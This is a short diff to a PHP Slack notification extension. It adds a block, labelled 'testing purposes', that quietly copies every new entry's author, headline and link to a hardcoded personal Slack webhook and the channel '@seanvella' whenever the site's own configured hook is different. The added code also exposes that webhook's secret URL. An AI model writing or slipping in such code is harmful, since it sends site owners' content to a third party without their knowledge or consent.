@@ -63,6 +63,27 @@ Class extension_slack extends  Extension {
             "title_link"=> $link
         ])->send('New entry created.');
 
+        //Testing purposes - send to me as well (only if config.php is not set to my hook)
+
+        if ($hook != 'https://hooks.slack.com/services/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'){
+
+            $hook = 'https://hooks.slack.com/services/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';
+            $channel = '@seanvella';
+
+            $settings = [
+                'username' => $username,
+                'channel' => $channel
+            ];
+
+            $client = new Maknz\Slack\Client($hook, $settings);
+
+            $client->attach([
+                "author_name" => $author,
+                "title"=> $headline,
+                "title_link"=> $link
+            ])->send('New entry created.');
+        }
+
     }
 
 }
